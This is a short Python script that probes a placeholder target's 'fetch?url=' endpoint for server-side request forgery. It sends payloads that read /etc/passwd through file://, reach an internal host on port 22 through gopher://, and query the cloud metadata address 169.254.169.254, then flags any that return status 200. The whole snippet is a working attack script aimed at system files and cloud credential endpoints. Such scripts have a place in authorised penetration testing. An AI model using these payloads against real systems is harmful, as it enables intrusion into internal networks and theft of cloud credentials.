payloads = ["file:///etc/passwd", "gopher://internal-server:22", "http://169.254.169.254/latest/meta-data"]  
for payload in payloads:  
    response = requests.get(f"https://target.com/fetch?url={payload}")  
    if response.status_code == 200:  
        print(f"[!] Vulnerable to SSRF: {payload}") 
